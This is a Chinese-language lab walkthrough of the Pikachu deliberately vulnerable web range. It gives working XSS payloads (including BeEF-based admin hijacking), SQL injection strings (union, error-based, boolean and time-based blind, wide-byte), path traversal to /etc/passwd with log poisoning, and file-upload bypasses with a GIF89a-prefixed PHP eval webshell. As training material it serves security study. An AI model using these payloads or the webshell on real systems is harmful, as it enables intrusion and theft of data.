[TOC]



# ==pikachu综合靶场漏洞讲解==

## XSS

### 反射性xss（get）

F12修改输入长度限制，直接 `<script>alert(/xss/)</sxript>`

### 反射性xss（post）

先登陆进去之后 在输入payload `<script>alert(/xss/)</sxript>`

![image-20240807185929906](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807185929906.png)

### 存储型xss

尝试输入 <''>' aaaa，然后查看页面源代码发现原封不动地出现在了页面当中

直接输入payload `<script>alert(/xss/)</sxript>`

### DOM型xss

尝试输入payload `<script>alert(/xss/)</script>` 给出了一个超链接 查看源代码，发现超链接的内容就是我们输入的内容，于是直接构造 `javascript:alert(/xss/)` 

![image-20240807195004053](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807195004053.png)

### DOM型xss-x

与上面同样的方法，尝试输入 `<script>alert(/xss/)</script>` 查看页面源代码，发现输入内容依旧是到了超链接中

![image-20240807195217688](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807195217688.png)

依旧是输入payload `javascript:alert(/xss/)`

![image-20240807195338965](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807195338965.png)

### xss盲打

这道题存粹是盲打

输入的内容都不知道在哪里，看一下提示

![image-20240807214034539](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807214034539.png)

难道这个题主要是用来攻击管理员的，我们可以将beefxss或者bluelotas生成的xss payload 放入这个输入框中，等待管理员访问就可以了

![image-20240807221039808](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807221039808.png)

![image-20240807221012493](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807221012493.png)

作为后台管理员登录尝试

![image-20240807221146371](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807221146371.png)

进入beef-xss管理界面，直接拿下

![image-20240807221310032](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807221310032.png)

### xss之过滤

尝试输入 `<script'>"` 发现最后输出的内容是 '>" 说明 <script 被过滤了 

试试大小写绕过 `<ScRiPt>` ，查看源代码还是存在的

![image-20240808105152878](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808105152878.png)

尝试payload `<ScRiPt>alert(/xss/)</ScRipt>` 成功

![image-20240808105245099](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808105245099.png)



### xss之htmlspecialchars

尝试输入正常内容发现被替换到超链接当中，再尝试特殊字符输入 `<'>(")script` 
![image-20240808105659658](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808105659658.png)

除了圆括号和script没有被转换，其他特殊字符基本都被转换为实体字符了，那么尝试payload `javascript:alert(/xss/)` 点击超链接，成功

![image-20240808105814808](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808105814808.png)

### xss之href输出

尝试输入特殊字符查看过滤情况和输出位置 `<'script'>(")` 发现依旧是特殊字符实体转换

![image-20240808110116053](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808110116053.png)

尝试 payload `javascript:alert(/xss/)` ，成功

![image-20240808110152706](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808110152706.png)

### xss之js输出

输入 `<'script'>(")` ，我们查看源代码可以发现，内容被动态生成到js代码中去了

![image-20240808110357387](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808110357387.png)

我们尝试按照他的代码来看看   闭合单引号 payload 如下  `tmac'; alert(document.cookie); //`  成功

![image-20240808112442842](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808112442842.png)

## SQL-Injection

### 数字型注入（post）

```
id=1 and 1=1
id=1 and 1=2
id=1 union select 1,2  //匹配columns_num
id=1 union select 1,database()
```

### 字符型注入（get）

```
vince
vince'
vince' and 1='1
vince' and 1='2
vince' #
vince' union select 1,database() #
```

### 搜索型注入

```
vince
vince'
vince' #
vince' union select 1,2#
vince' union select 1,database(),3#
```

### xx型注入

```
vince
vince'       报错
vince' #     报错
vince' --+   报错
查看报错信息，发现出现了圆括号，尝试闭合
vince') #    成功
vince') union select 1,2#
vince') union select 1,database()#
```

### insert/update注入

既然是insert/update注入，那么就是更新类注入，一般情况下会优先考虑报错注入

先尝试登录一下，登录成功之后是这样的，warning是因为PHP版本不同，我用的是PHP7.3的版本，比较新。在php7中，MYSQL_ASSOC不再是一个常量，将 MYSQL_ASSOC改为MYSQLI_ASSOC，意思是mysqli的方式提取数组，而不再是mysql 。（原因：mysql_fetch_arrayhan函数转为mysqli_fetch_array，参数没有修改）

![image-20240808134712474](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808134712474.png)

```
```

![image-20240808135135673](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808135135673.png)

我们尝试注册一下

```
username:baba'
password:123456
以上情况果不其然报错了

username:baba')
password:123456
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '',md5('123456'),'','','','')' at line 1
username:baba')#
password:123456
Column count doesn't match value count at row 1


这种情况我们需要在password处做文章，且要求单引号圆括号闭合
username:baba')#
password:') and updatexml(1,concat(0x7e,database(),0x7e),1) and ('
XPATH syntax error: '~pikachu~'

成了
```

### delete注入

尝试发表正常的留言，鼠标放在删除的超链接上，可以发现后面有一个id参数，我们可以尝试注入一下

![image-20240808141627796](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808141627796.png)

 不过这里我们就需要抓包了，开启抓包，点击删除

![image-20240808141753852](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808141753852.png)

我们发现这是数字型注入，简单，直接上payload

留言一次删一次，不然一直都会报错，或者因为是数字型注入，直接上payload即可

```
updatexml(1,concat(0x7e,database(),0x7e),1) 
```

### http头注入

登录访问抓包 一共有两个包，两个都尝试一下 分开尝试，因为害怕其中一个请求出问题会导致另一个请求也出问题。测试发现第二个请求才是回显到页面上内容的请求，第一次直接使用 `updatexml(1,concat(0x7e,database(),0x7e),1)` 发现这段payload直接输出到页面上，说明这是字符型的注入（当然，一般情况下http头注，基本上都是字符型的，哪来的数字型），那么接下来就闭合单引号，测试发现 # 和 --+ 都不能作为注释符，那就使用 or 逻辑符号 `' or updatexml(1,concat(0x7e,database(),0x7e),1) or '` 成功闭合

![image-20240808191121158](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808191121158.png)

而且我发现，既然页面会输出我的请求头信息，那是否会存在反射性xss漏洞呢，尝试了一下payload使用 `<script>alert(/xss/)</script>` 也是成功的

![image-20240808192116226](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808192116226.png)

### boolian盲注

尝试在输入框中输入信息，很多次，无果，于是就直接抓包尝试，闭合单引号过程中发现了这个问题，闭合成功了

![image-20240808193349562](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808193349562.png)

那再尝试能不能注释掉单引号，确实可以

![image-20240808193534353](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808193534353.png)

尝试payload `vince'+and+length(database())%3d7%23` 也就是 `vince' and length(database())=7#` 

![image-20240808193942223](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808193942223.png)

![image-20240808194033042](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808194033042.png)

把数据库长度换个数字就不行了，由此成功实现布尔盲注

### 时间盲注

估计和上面差不多，尝试更换条件为 

```
vince'+and+if(length(database())<10,sleep(5),1)+%23
即 
vince' and if(length(database())<10,sleep(5),1) # 
确定好数据库名称长度之后，就可以利用substr来爆破表名 比如 
vince' and if(substr(database(),1,1)="p",sleep(5),1) #
同样的道理可以用在用户名 
vince' and if(substr(user(),1,1)="p",sleep(5),1) # 
等 
vince' and if(substr((select group_concat(column_name) from information_schema.columns where table_name="pikachu"),1,1)="p",sleep(5),1) #
```

> ```
> select group_concat(table_name) from information_schema.tables where table_schema="pikachu"
> 
> select group_concat(column_name) from information_schema.columns where table_name="users"
> 
> select 1,(select group_concat(concat(userid,"==",username,"==",password)) from users
> ```

### 宽字节注入

既然知道了是宽字节注入，那么我们就应该知道宽字节注入的原理，我们常用的是 %bf 来闭合单引号绕过

bp抓包 payload `baba%bf'+union+select+1,database()%23`

![image-20240808223807736](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808223807736.png)

![image-20240808223950746](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808223950746.png)

## File Inclusion

### local

直接使用 /etc/passwd 报错

![image-20240808224222884](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808224222884.png)

说明，后台代码应该添加了文件目录前缀，于是我们可以使用 ../ 来进行绕过

![image-20240808224126742](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808224126742.png)

**甚至还可以包含Web日志**

- 访问该应用系统并用bp抓包，注意分清楚这是什么中间件搭建的服务器，我们这里是 xampp web日志存在于 /opt/lammp/logs/access_log 文件中 。先随便访问一个网页，bp抓包，修改参数内容如下

  ![image-20240808225240574](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808225240574.png)

- 然后访问

  ![image-20240808225433045](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808225433045.png)

  往下滑

  ![image-20240808225522959](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808225522959.png)

### remote

由于本地防火墙的原因，虚拟机无法直接包含物理机的文件，所以在此就稍微看以下错误，拒绝连接

![image-20240808231358125](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240808231358125.png)

## Unsafe Filedownload

这道题目简单，点击下载之后浏览器URL地址没有任何变化，于是 F12 定位到超链接位置，将超链接更换到URL地址处，输入自己想要下载的文件即可

![image-20240809092155002](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240809092155002.png)

## Unsafe Fileupload

### client check

看到客户端校验就想到前端 js 校验，直接禁用 js 记得刷新，然后上传文件即可

![image-20240809101634303](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240809101634303.png)

![image-20240809101842731](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240809101842731.png)

### MIME type

检查文件类型，bp抓包，修改content-type即可

![image-20240809102120204](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240809102120204.png)

结果和上面是一样的

### getimagesize

该函数会检查上传的文件是否为一张图片，并获取图片的长 宽等参数。该怎么绕过getimagesize这个函数呢

```php
GIF89a
<?php @eval($_POST["a"]);?>
```

使用GIF89a绕过 但是会告诉我们还判断了文件后缀名，尝试禁用 js 这里不是弹窗 禁用 js 好像不太行

![image-20240809105932148](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240809105932148.png)

那既然如此，我们就上传一个图片马， 然后bp抓包，修改文件后缀试试，都不行

于是我只能利用文件上传加文件包含了，也就是在这边上传图片马，然后利用文件包含

![image-20240809111432136](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240809111432136.png)

![image-20240809111448485](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240809111448485.png)
